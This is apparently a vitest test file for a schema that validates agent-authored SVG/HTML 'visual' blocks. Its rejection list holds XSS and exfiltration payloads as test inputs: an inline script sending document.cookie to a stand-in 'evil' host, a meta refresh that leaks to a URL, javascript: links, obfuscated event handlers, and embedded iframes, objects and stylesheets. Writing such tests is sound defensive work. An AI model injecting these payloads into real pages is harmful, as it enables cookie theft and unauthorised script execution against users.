import { describe, expect, it } from 'vitest'
import { Block } from './blocks.js'

// The `visual` block carries agent-authored static SVG/HTML. The real security
// boundary is the sandboxed iframe in the renderer; these schema guards are
// defense-in-depth that reject the obvious script/navigation/exfil vectors before
// the markup ever reaches the DOM.
describe('VisualBlock', () => {
  it('accepts a minimal svg visual sized by aspectRatio', () => {
    const r = Block.safeParse({
      id: 'v', type: 'visual', format: 'svg', aspectRatio: 16 / 9,
      source: '<svg viewBox="0 0 16 9"><rect width="16" height="9" fill="var(--bg-2)"/></svg>',
    })
    expect(r.success).toBe(true)
  })

  it('accepts a minimal html visual sized by an explicit height', () => {
    const r = Block.safeParse({
      id: 'v', type: 'visual', format: 'html', height: 200,
      source: '<div style="padding:8px;color:var(--ink)">hello</div>',
    })
    expect(r.success).toBe(true)
  })

  it.each([
    ['inline <script>', '<svg><script>fetch("//evil/"+document.cookie)</script></svg>'],
    ['uppercase <SCRIPT>', '<div><SCRIPT>x()</SCRIPT></div>'],
    ['event handler', '<svg onload="x()"></svg>'],
    ['javascript: url', '<a href="javascript:alert(1)">x</a>'],
    ['<meta http-equiv refresh>', '<meta http-equiv="refresh" content="0;url=https://evil/?leak">'],
    ['<base>', '<base href="https://evil/">'],
    ['<link>', '<link rel="stylesheet" href="https://evil/x.css">'],
    ['nested iframe', '<iframe src="https://evil/"></iframe>'],
    ['object embed', '<object data="https://evil/"></object>'],
    ['SMIL animation', '<svg><animate attributeName="x" to="9"/></svg>'],
    ['doctype/DTD', '<!DOCTYPE html><div>x</div>'],
    ['slash-separated <script/src>', '<script/src="data:text/javascript,alert(1)"></script>'],
    ['slash-separated event handler', '<svg/onload=alert(1)>'],
    ['quote-adjacent event handler', '<div class="x"onclick=alert(1)>x</div>'],
    ['external link (double-quoted)', '<a href="https://evil.example/">click</a>'],
    ["external link (single-quoted)", "<a href='//evil.example/'>click</a>"],
    ['external link (unquoted)', '<a href=https://evil.example/>click</a>'],
    ['relative link (non-fragment)', '<a href="/api/cards">click</a>'],
  ])('rejects %s', (_label, source) => {
    expect(Block.safeParse({ id: 'v', type: 'visual', format: 'html', height: 200, source }).success).toBe(false)
  })

  it('keeps fragment-only links and SVG internal references valid', () => {
    for (const source of [
      '<svg viewBox="0 0 4 4"><defs><linearGradient id="g"/></defs><rect fill="url(#g)" href="#g" width="4" height="4"/></svg>',
      '<svg viewBox="0 0 4 4"><use xlink:href="#shape"/></svg>',
      '<div><a href="#section-2">jump</a></div>',
    ]) {
      expect(Block.safeParse({ id: 'v', type: 'visual', format: 'html', height: 200, source }).success).toBe(true)
    }
  })

  it('rejects an oversized source', () => {
    expect(Block.safeParse({
      id: 'v', type: 'visual', format: 'html', height: 200, source: 'x'.repeat(24_001),
    }).success).toBe(false)
  })

  it('rejects out-of-bounds aspectRatio and height', () => {
    expect(Block.safeParse({ id: 'v', type: 'visual', format: 'svg', aspectRatio: 0, source: '<svg/>' }).success).toBe(false)
    expect(Block.safeParse({ id: 'v', type: 'visual', format: 'html', height: 10, source: '<div></div>' }).success).toBe(false)
    expect(Block.safeParse({ id: 'v', type: 'visual', format: 'html', height: 9999, source: '<div></div>' }).success).toBe(false)
  })

  it('accepts tall-but-honest heights up to 2000 so html visuals can show all their content', () => {
    expect(Block.safeParse({ id: 'v', type: 'visual', format: 'html', height: 2000, source: '<div></div>' }).success).toBe(true)
    expect(Block.safeParse({ id: 'v', type: 'visual', format: 'html', height: 2001, source: '<div></div>' }).success).toBe(false)
  })
})
